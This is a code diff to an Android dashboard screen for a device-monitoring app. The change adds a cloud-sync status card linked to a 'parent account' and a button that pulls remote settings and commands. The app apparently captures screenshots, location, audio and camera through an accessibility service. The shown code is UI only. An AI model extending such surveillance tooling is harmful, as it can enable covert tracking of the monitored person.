@@ -3,7 +3,6 @@ package com.example.telegramsender.ui
 import android.content.Context
 import android.content.Intent
 import android.content.SharedPreferences
-import android.graphics.drawable.GradientDrawable
 import android.os.Build
 import android.os.Bundle
 import android.provider.Settings
@@ -12,17 +11,34 @@ import android.view.LayoutInflater
 import android.view.View
 import android.view.ViewGroup
 import android.widget.TextView
+import android.widget.Toast
 import androidx.core.content.ContextCompat
 import androidx.fragment.app.Fragment
+import androidx.lifecycle.lifecycleScope
 import com.example.telegramsender.MonitorService
 import com.example.telegramsender.R
 import com.example.telegramsender.TelegramService
+import com.example.telegramsender.data.DevicePreferences
+import com.example.telegramsender.utils.SyncHelper
 import com.google.android.material.button.MaterialButton
+import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.launch
+import kotlinx.coroutines.withContext
 import java.text.SimpleDateFormat
 import java.util.*
 
 class DashboardFragment : Fragment() {
 
+    // Cloud Sync Card Views
+    private lateinit var syncStatusIndicator: View
+    private lateinit var syncStatusBadge: TextView
+    private lateinit var syncAccountText: TextView
+    private lateinit var syncLastTimeText: TextView
+    private lateinit var syncFrequencyText: TextView
+    private lateinit var syncDetailsText: TextView
+    private lateinit var btnManualSync: MaterialButton
+
+    // Device Status Views
     private lateinit var connectionIndicator: View
     private lateinit var connectionStatusText: TextView
     private lateinit var permissionSummaryText: TextView
@@ -45,6 +61,16 @@ class DashboardFragment : Fragment() {
         
         pref = requireContext().getSharedPreferences("tg_pref", Context.MODE_PRIVATE)
         
+        // Cloud Sync Views
+        syncStatusIndicator = view.findViewById(R.id.syncStatusIndicator)
+        syncStatusBadge = view.findViewById(R.id.syncStatusBadge)
+        syncAccountText = view.findViewById(R.id.syncAccountText)
+        syncLastTimeText = view.findViewById(R.id.syncLastTimeText)
+        syncFrequencyText = view.findViewById(R.id.syncFrequencyText)
+        syncDetailsText = view.findViewById(R.id.syncDetailsText)
+        btnManualSync = view.findViewById(R.id.btnManualSync)
+
+        // Device Status Views
         connectionIndicator = view.findViewById(R.id.connectionIndicator)
         connectionStatusText = view.findViewById(R.id.connectionStatusText)
         permissionSummaryText = view.findViewById(R.id.permissionSummaryText)
@@ -64,6 +90,10 @@ class DashboardFragment : Fragment() {
             toggleMonitoring()
         }
 
+        btnManualSync.setOnClickListener {
+            performManualDashboardSync()
+        }
+
         return view
     }
 
@@ -73,10 +103,13 @@ class DashboardFragment : Fragment() {
     }
 
     private fun updateUI() {
-        // 0. Health Check
+        // 0. Cloud Sync Status
+        updateCloudSyncUI()
+
+        // 1. Health Check
         performHealthCheck()
 
-        // 1. Connection Status
+        // 2. Connection Status
         val isServiceActive = isAccessibilityServiceEnabled()
         if (isServiceActive) {
             connectionStatusText.text = "Device Connected"
@@ -86,7 +119,7 @@ class DashboardFragment : Fragment() {
             connectionIndicator.background = ContextCompat.getDrawable(requireContext(), R.drawable.circle_red)
         }
 
-        // 2. Permission Summary
+        // 3. Permission Summary
         var count = 0
         if (isAccessibilityServiceEnabled()) count++
         if (hasPermission(android.Manifest.permission.ACCESS_FINE_LOCATION)) count++
@@ -96,7 +129,7 @@ class DashboardFragment : Fragment() {
         
         permissionSummaryText.text = "Permissions: $count/5 Enabled"
 
-        // 3. Monitoring Summary
+        // 4. Monitoring Summary
         val activeFeatures = mutableListOf<String>()
         if (pref.getBoolean("sendScreenshot", true)) activeFeatures.add("Screens")
         if (pref.getBoolean("sendLocation", false)) activeFeatures.add("Location")
@@ -104,7 +137,7 @@ class DashboardFragment : Fragment() {
         if (pref.getBoolean("sendCamera", false)) activeFeatures.add("Camera")
         monitoringSummaryText.text = "Monitoring: " + if (activeFeatures.isEmpty()) "None" else activeFeatures.joinToString(", ")
 
-        // 4. Monitoring State
+        // 5. Monitoring State
         val isMonitoring = pref.getBoolean("is_monitoring_active", false)
         if (isMonitoring) {
             statusStateText.text = "ACTIVE"
@@ -118,10 +151,125 @@ class DashboardFragment : Fragment() {
             mainActionButton.setBackgroundColor(ContextCompat.getColor(requireContext(), R.color.green_start))
         }
 
-        // 5. Activity Feed
+        // 6. Activity Feed
         updateFeedbackTime(lastScreenshotTime, "last_screenshot_sent")
         updateFeedbackTime(lastLocationTime, "last_location_sent")
         updateFeedbackTime(lastAudioTime, "last_audio_sent")
+    }
+
+    private fun updateCloudSyncUI() {
+        val isRegistered = DevicePreferences.isRegistered(requireContext())
+        if (!isRegistered) {
+            syncStatusIndicator.background = ContextCompat.getDrawable(requireContext(), R.drawable.circle_gray)
+            syncStatusBadge.text = "NOT PAIRED"
+            syncStatusBadge.setTextColor(ContextCompat.getColor(requireContext(), R.color.gray_paused))
+            syncAccountText.text = "Linked: Not connected to dashboard"
+            syncLastTimeText.text = "Last Synced: Never"
+            syncFrequencyText.text = "Status: Open Setup Wizard to pair with parent account"
+            syncDetailsText.text = "Tap button below to start pairing wizard."
+            btnManualSync.isEnabled = true
+            btnManualSync.text = "RUN SETUP WIZARD TO PAIR"
+            btnManualSync.setOnClickListener {
+                startActivity(Intent(requireContext(), SetupWizardActivity::class.java))
+            }
+            return
+        }
+
+        btnManualSync.text = "CHECK / SYNC WITH DASHBOARD"
+        btnManualSync.setOnClickListener {
+            performManualDashboardSync()
+        }
+
+        val parentEmail = DevicePreferences.getParentEmail(requireContext()) ?: "Parent Account"
+        syncAccountText.text = "Linked: $parentEmail"
+
+        val syncSec = DevicePreferences.getSyncIntervalSeconds(requireContext())
+        val freqDisplay = if (syncSec < 60) "${syncSec}s (Real-time)" else "${syncSec / 60} min"
+        syncFrequencyText.text = "Heartbeat: Every $freqDisplay"
+
+        val lastSync = DevicePreferences.getLastSyncTime(requireContext())
+        val status = DevicePreferences.getLastSyncStatus(requireContext())
+        val error = DevicePreferences.getLastSyncError(requireContext())
+
+        if (lastSync == 0L) {
+            syncStatusIndicator.background = ContextCompat.getDrawable(requireContext(), R.drawable.circle_gray)
+            syncStatusBadge.text = "NEVER SYNCED"
+            syncStatusBadge.setTextColor(ContextCompat.getColor(requireContext(), R.color.gray_paused))
+            syncLastTimeText.text = "Last Synced: Waiting for initial heartbeat"
+        } else {
+            val diffMs = System.currentTimeMillis() - lastSync
+            val diffSec = diffMs / 1000
+            val exactTime = SimpleDateFormat("h:mm:ss a", Locale.getDefault()).format(Date(lastSync))
+
+            val timeAgo = when {
+                diffSec < 60 -> "${diffSec}s ago"
+                diffSec < 3600 -> "${diffSec / 60}m ago"
+                else -> "${diffSec / 3600}h ago"
+            }
+
+            syncLastTimeText.text = "Last Synced: $timeAgo ($exactTime)"
+
+            val thresholdMs = Math.max(30000L, syncSec * 2500L)
+            if (status == "ERROR") {
+                syncStatusIndicator.background = ContextCompat.getDrawable(requireContext(), R.drawable.circle_red)
+                syncStatusBadge.text = "SYNC ERROR"
+                syncStatusBadge.setTextColor(ContextCompat.getColor(requireContext(), R.color.red_pause))
+            } else if (diffMs <= thresholdMs) {
+                syncStatusIndicator.background = ContextCompat.getDrawable(requireContext(), R.drawable.circle_green)
+                syncStatusBadge.text = "IN SYNC (ONLINE)"
+                syncStatusBadge.setTextColor(ContextCompat.getColor(requireContext(), R.color.green_active))
+            } else if (diffMs <= 300000L) {
+                syncStatusIndicator.background = ContextCompat.getDrawable(requireContext(), R.drawable.circle_gray)
+                syncStatusBadge.text = "SYNC DELAYED"
+                syncStatusBadge.setTextColor(ContextCompat.getColor(requireContext(), R.color.gray_paused))
+            } else {
+                syncStatusIndicator.background = ContextCompat.getDrawable(requireContext(), R.drawable.circle_red)
+                syncStatusBadge.text = "DESYNCED"
+                syncStatusBadge.setTextColor(ContextCompat.getColor(requireContext(), R.color.red_pause))
+            }
+        }
+
+        val summary = DevicePreferences.getLastSyncSummary(requireContext())
+        if (!summary.isNullOrEmpty()) {
+            syncDetailsText.text = summary
+        } else if (!error.isNullOrEmpty()) {
+            syncDetailsText.text = "Sync error: $error"
+        } else {
+            syncDetailsText.text = "Ready to sync telemetry and remote settings with cloud."
+        }
+    }
+
+    private fun performManualDashboardSync() {
+        if (!DevicePreferences.isRegistered(requireContext())) {
+            startActivity(Intent(requireContext(), SetupWizardActivity::class.java))
+            return
+        }
+
+        btnManualSync.isEnabled = false
+        btnManualSync.text = "SYNCING WITH DASHBOARD..."
+
+        lifecycleScope.launch(Dispatchers.IO) {
+            val result = SyncHelper.performSync(requireContext())
+            withContext(Dispatchers.Main) {
+                btnManualSync.isEnabled = true
+                btnManualSync.text = "CHECK / SYNC WITH DASHBOARD"
+                updateUI()
+
+                if (result.success) {
+                    Toast.makeText(
+                        requireContext(),
+                        "✓ In Sync! Downloaded latest settings & commands from dashboard.",
+                        Toast.LENGTH_LONG
+                    ).show()
+                } else {
+                    Toast.makeText(
+                        requireContext(),
+                        "Sync Failed: ${result.errorMessage ?: "Network error"}",
+                        Toast.LENGTH_LONG
+                    ).show()
+                }
+            }
+        }
     }
 
     private fun updateFeedbackTime(textView: TextView, key: String) {
